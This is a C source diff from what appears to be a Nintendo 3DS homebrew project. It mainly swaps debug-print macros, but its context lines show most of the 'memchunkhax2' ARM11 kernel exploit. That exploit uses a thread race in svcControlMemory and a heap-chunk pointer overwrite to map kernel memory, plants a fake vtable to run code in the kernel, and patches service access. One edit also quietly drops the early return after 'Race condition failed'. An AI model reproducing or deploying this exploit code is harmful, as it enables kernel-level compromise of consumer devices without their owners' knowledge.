@@ -5,11 +5,12 @@
 #include <string.h>
 
 #ifdef SUDEBUG
-	#define debugPrint(...) 		printf(__VA_ARGS__)
-	#define debugPrintError(...) 	({printf(__VA_ARGS__); return -1;})
+void suPuts(const char *s);
+	#define debugPuts(s) 		suPuts(s)
+	#define debugPutsError(s) 	({suPuts(s); return -1;})
 #else
-	#define debugPrint(...) 
-	#define debugPrintError(...) 	({return -1;})
+	#define debugPuts(s)
+	#define debugPutsError(s) 	({return -1;})
 #endif
 
 u8 isNew3DS = 0;
@@ -20,13 +21,13 @@ int memchunkhax2();
 int suInit()
 {
 	APT_CheckNew3DS(&isNew3DS);
-	debugPrint("ARM11 Kernel Exploit\n");
+	debugPuts("ARM11 Kernel Exploit");
 	
 	int res = memchunkhax2();
 	if(!res) 
-		debugPrint("Success!\n");
+		debugPuts("Success!");
 	else
-		debugPrint("Failure! :(\n");
+		debugPuts("Failure! :(");
 	
 	return res;
 }
@@ -152,33 +153,33 @@ int memchunkhax2()
     Thread delayThread = NULL;
 	Result res;
 	
-	debugPrint("#1 : Allocating buffers...\n");
+	debugPuts("#1 : Allocating buffers...");
 	AllocateData* data = (AllocateData*) malloc(sizeof(AllocateData));
-	if(!data) debugPrintError("ERROR : Can't allocate data.\n");
+	if(!data) debugPutsError("ERROR : Can't allocate data.");
 	data->addr = __ctru_heap + __ctru_heap_size;
     data->size = PAGE_SIZE * 2;
     data->result = -1;
 	
     void** vtable = (void**) linearAlloc(16 * sizeof(u32));
-	if(!vtable) debugPrintError("ERROR : Can't allocate data.\n");
+	if(!vtable) debugPutsError("ERROR : Can't allocate data.");
 	for(int i = 0; i < 16; i++) {
         vtable[i] = kernel_entry;
     }
 	
     void* backup = malloc(PAGE_SIZE);
-	if(!backup) debugPrintError("ERROR : Can't allocate data.\n");
+	if(!backup) debugPutsError("ERROR : Can't allocate data.");
 	
-	debugPrint("#2 : Allocating pages...\n");
+	debugPuts("#2 : Allocating pages...");
 	// Makes all the threads be on core 1
     aptOpenSession();
     if(APT_SetAppCpuTimeLimit(30) != 0)
-		debugPrintError("ERROR : Can't force threads to core 1.\n");
+		debugPutsError("ERROR : Can't force threads to core 1.");
     aptCloseSession();
 	
 	res = svcControlMemory(&isolatedPage, data->addr + data->size, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
 	if(!res) res = svcControlMemory(&isolatingPage, isolatedPage + PAGE_SIZE, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
     if(!res) res = svcControlMemory(&isolatedPage, isolatedPage, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
-	if(res != 0) debugPrintError("ERROR : Can't allocate pages.\n");
+	if(res != 0) debugPutsError("ERROR : Can't allocate pages.");
 	
 	isolatedPage = 0;
 	
@@ -187,19 +188,19 @@ int memchunkhax2()
     // Prev does not matter, as any verification happens prior to the overwrite.
     // However, next must be 0, as it does not use size to check when allocation is finished.
     if(svcCreateEventKAddr(&kObjHandle, 0, &kObjAddr) != 0)
-		debugPrintError("ERROR : Can't create kernel object.\n");
+		debugPutsError("ERROR : Can't create kernel object.");
 	
 	// Consider the physical address of the kobject, preventing the kernel shift.
 	kObjAddr = kObjAddr - SLABHEAP_VIRTUAL + SLABHEAP_PHYSICAL - KERNEL_SHIFT;
 	
-	debugPrint("#3 : Map SlabHeap in userland...\n");
+	debugPuts("#3 : Map SlabHeap in userland...");
 	// Create thread to slow down svcControlMemory execution and another to allocate the pages.
     delayThread = threadCreate(delay_thread, data, 0x4000, 0x18, 1, true);
 	if(!delayThread)
-		debugPrintError("ERROR : Can't create delaying thread.\n");
+		debugPutsError("ERROR : Can't create delaying thread.");
 		
     if(!threadCreate(allocate_thread, data, 0x4000, 0x3F, 1, true))
-		debugPrintError("ERROR : Can't create allocating thread.\n");
+		debugPutsError("ERROR : Can't create allocating thread.");
 	
 	waitUserlandAccessible(data->addr);	// This oracle will tell us exactly when we can write in memory.
 	((MemChunkHdr*) data->addr)->next = (MemChunkHdr*) kObjAddr;   // Edit the memchunk to redirect mem mapping.
@@ -207,25 +208,25 @@ int memchunkhax2()
 	// Perform a backup of the kernel page (or at least for what we can)
 	waitUserlandAccessible(data->addr + PAGE_SIZE + (kObjAddr & 0xFFF)); 
 	memcpy(backup, (void*) (data->addr + PAGE_SIZE + (kObjAddr & 0xFFF) ), PAGE_SIZE - (kObjAddr & 0xFFF));
-	if(data->result != -1) debugPrintError("ERROR : Race condition failed.\n");
+	if(data->result != -1) debugPuts("ERROR : Race condition failed.");
 	
-	debugPrint("#4 : Overwrite completed...\n");
+	debugPuts("#4 : Overwrite completed...");
 	// Wait for memory mapping to complete.
     while(data->result == -1) svcSleepThread(1000000);
-	if(data->result != 0) debugPrintError("ERROR : Failed memory mapping.\n");
+	if(data->result != 0) debugPutsError("ERROR : Failed memory mapping.");
 	
-	debugPrint("#5 : Restoring SlabHeap backup...\n");
+	debugPuts("#5 : Restoring SlabHeap backup...");
 	// Restore the kernel memory backup first
 	memcpy((void*) (data->addr + PAGE_SIZE + (kObjAddr & 0xFFF)), backup, PAGE_SIZE - (kObjAddr & 0xFFF));
 	
-	debugPrint("#6 : Setup fake vtable and release object...\n");
+	debugPuts("#6 : Setup fake vtable and release object...");
 	//waitUserlandAccessible(data->addr + PAGE_SIZE + (kObjAddr & 0xFFF) - 4); 
     *(void***) (data->addr + PAGE_SIZE + (kObjAddr & 0xFFF) - 4) = vtable;
 	
 	// With this the kernel should run our code
 	if(kObjHandle != 0) svcCloseHandle(kObjHandle);
 	
-	debugPrint("#7 : Clean memory...\n");
+	debugPuts("#7 : Clean memory...");
 	if(data != NULL && data->result == 0)
         svcControlMemory(&data->addr, data->addr, 0, data->size, MEMOP_FREE, MEMPERM_DONTCARE);
 		
@@ -247,7 +248,7 @@ int memchunkhax2()
 	if(vtable) linearFree(vtable);
 	
 	while(kernelHacked != 0) svcSleepThread(1000000);
-	debugPrint("#8 : Grant access to all services...\n");
+	debugPuts("#8 : Grant access to all services...");
 	patchServiceAccess();
 	svcSleepThread(0x4000000LL);
 	APT_SetAppCpuTimeLimit(80);
